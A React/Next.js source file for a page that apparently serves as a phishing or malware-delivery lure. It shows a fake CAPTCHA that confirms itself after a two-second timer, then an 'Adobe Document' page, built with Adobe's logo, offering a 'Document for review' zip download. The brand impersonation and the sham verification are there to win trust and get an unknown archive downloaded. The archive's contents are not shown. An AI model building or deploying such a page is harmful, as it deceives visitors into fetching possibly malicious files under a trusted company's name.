
"use client";

import { useEffect, useRef, useState } from "react";
import Image from "next/image";

const DOWNLOAD_URL = "/document-review.zip";
const DOWNLOAD_NAME = "document-review.zip";
const DOCUMENT_TITLE = "Document for review";

type CheckStatus = "idle" | "checking" | "complete";

function DocumentIcon({ className = "" }: { className?: string }) {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.5"
      strokeLinecap="round"
      strokeLinejoin="round"
      className={className}
    >
      <path d="M14 3H6a1 1 0 0 0-1 1v16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V8l-5-5Z" />
      <path d="M14 3v5h5M8 12h8M8 16h5" />
    </svg>
  );
}

function ArrowIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.6"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-4 w-4"
    >
      <path d="M5 12h14m-5-5 5 5-5 5" />
    </svg>
  );
}

function DownloadIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.6"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-4 w-4"
    >
      <path d="M12 3v12m-4-4 4 4 4-4M5 16v4h14v-4" />
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2.5"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-7 w-7 text-emerald-700"
    >
      <path d="m5 12 4 4L19 6" />
    </svg>
  );
}

function CaptchaScreen({ onContinue }: { onContinue: () => void }) {
  const [status, setStatus] = useState<CheckStatus>("idle");

  useEffect(() => {
    if (status !== "checking") return;

    const timer = window.setTimeout(() => {
      setStatus("complete");
    }, 2000);

    return () => window.clearTimeout(timer);
  }, [status]);

  return (
    <section
      aria-labelledby="captcha-title"
      className="w-full max-w-[380px]"
    >
      <div className="mb-7 text-center">
        <p
          id="captcha-title"
          className="text-xl font-medium tracking-tight sm:text-[14px]"
        >
          Before you continue
        </p>
      </div>

      <div className="rounded-xl border border-stone-200 bg-white p-5 shadow-[0_8px_30px_-20px_rgba(0,0,0,0.18)] sm:p-7">
        <div className="flex items-center justify-between gap-3 rounded-md border border-stone-200 bg-stone-50 px-3 py-5">
          <label className="flex min-w-0 items-center gap-3">
            <span className="grid h-7 w-7 shrink-0 place-items-center">
              <input
                type="checkbox"
                checked={status !== "idle"}
                disabled={status !== "idle"}
                onChange={(event) => {
                  if (event.target.checked) {
                    setStatus("checking");
                  }
                }}
                aria-describedby="checkbox-status"
                className={
                  status === "idle"
                    ? "h-7 w-7 cursor-pointer accent-emerald-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-stone-600"
                    : "sr-only"
                }
              />

              {status === "checking" && (
                <span
                  aria-hidden="true"
                  className="h-6 w-6 animate-spin rounded-full border-2 border-stone-200 border-t-stone-700 motion-reduce:animate-none"
                />
              )}

              {status === "complete" && <CheckIcon />}
            </span>

            <span className="text-[13px] text-stone-800">
              I&apos;m not a robot
            </span>
          </label>

          <div
            aria-hidden="true"
            className="shrink-0 text-center text-stone-400"
          >
            <svg
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.5"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="mx-auto mb-1 h-6 w-6"
            >
              <path d="M12 3 4 6v6c0 5 8 9 8 9s8-4 8-9V6l-8-3Z" />
              <path d="m9 12 2 2 4-4" />
            </svg>
          </div>
        </div>

        <p
          id="checkbox-status"
          role="status"
          aria-live="polite"
          aria-atomic="true"
          className={`mt-3 min-h-5 text-xs ${
            status === "complete"
              ? "text-emerald-700"
              : "text-stone-500"
          }`}
        >
          {status === "idle"
            ? "Select the checkbox to begin."
            : status === "checking"
              ? "Confirming your selection…"
              : "Complete. You may now continue."}
        </p>

        <button
          type="button"
          disabled={status !== "complete"}
          onClick={() => {
            if (status === "complete") onContinue();
          }}
          className="mt-5 flex w-full items-center justify-center gap-3 rounded-md bg-stone-900 px-4 py-3 text-sm font-medium text-white transition-colors hover:bg-stone-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-stone-600 disabled:cursor-not-allowed disabled:bg-stone-200 disabled:text-stone-400"
        >
          Continue
          <ArrowIcon />
        </button>
      </div>
    </section>
  );
}

export default function Home() {
  const [captchaComplete, setCaptchaComplete] = useState(false);

  const titleRef = useRef<HTMLHeadingElement>(null);

  useEffect(() => {
    if (captchaComplete) {
      titleRef.current?.focus();
    }
  }, [captchaComplete]);

  return (
    <div className="relative isolate flex h-screen h-[100dvh] flex-col overflow-hidden bg-[#F8F8F6] font-sans text-stone-900 selection:bg-stone-200">
      {/* Full-screen background shown after continuing */}
      {captchaComplete && (
        <div
          aria-hidden="true"
          className="pointer-events-none fixed inset-0 -z-10 overflow-hidden"
        >
          <Image
            src="/adobe.png"
            alt=""
            fill
            priority
            sizes="100vw"
            className="scale-110 object-cover opacity-[0.12] blur-2xl"
          />

          <div className="absolute inset-0 bg-white/75" />
        </div>
      )}

      <header className="shrink-0 border-b border-stone-200/80 bg-white/20 backdrop-blur-sm">
        <div className="mx-auto flex h-16 w-full max-w-6xl items-center justify-between px-5 sm:px-8">
          <a
            href="/"
            aria-label="Document Space home"
            className="flex items-center gap-2.5 rounded focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-stone-600"
          >
            <Image
              src="/adobe.png"
              alt="Adobe icon"
              width={32}
              height={32}
              priority
              className="h-8 w-8 object-contain"
            />

            <span className="text-sm font-semibold tracking-tight">
              Adobe Document
            </span>
          </a>
        </div>
      </header>

      <main className="relative flex min-h-0 flex-1 overflow-y-auto px-5 py-6">
        <div className="my-auto flex w-full justify-center">
          {!captchaComplete ? (
            <CaptchaScreen
              onContinue={() => setCaptchaComplete(true)}
            />
          ) : (
            <section
              aria-labelledby="page-title"
              className="relative w-full max-w-[400px]"
            >
              <div className="mb-7 text-center">
                <p className="mb-3 text-[10px] font-semibold uppercase tracking-[0.22em] text-stone-500">
                  Shared with you
                </p>

              </div>

              <div className="rounded-xl border border-stone-200/80 bg-white/40 p-6 shadow-[0_12px_40px_-24px_rgba(0,0,0,0.22)] backdrop-blur-md sm:p-7">
                <div className="mb-5 flex items-center justify-between">
                  <span className="grid h-12 w-12 place-items-center rounded-lg border border-stone-200 bg-stone-50">
                    <DocumentIcon className="h-6 w-6 text-stone-600" />
                  </span>
                </div>

                <h2 className="break-words text-lg font-medium tracking-tight">
                  {DOCUMENT_TITLE}
                </h2>

                <div className="my-5 h-px bg-stone-100" />

                <a
                  href={DOWNLOAD_URL}
                  download={DOWNLOAD_NAME}
                  className="flex w-full items-center justify-center gap-3 rounded-md bg-stone-900 px-4 py-3 text-sm font-medium text-white transition-colors hover:bg-stone-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-stone-600"
                >
                  Download
                  <DownloadIcon />
                </a>
              </div>
            </section>
          )}
        </div>
      </main>

      <footer className="shrink-0 border-t border-stone-200/70 bg-white/60 px-5 py-4 text-center text-[10px] text-stone-400 backdrop-blur-md">
        Adobe Document @2026
      </footer>
    </div>
  );
}
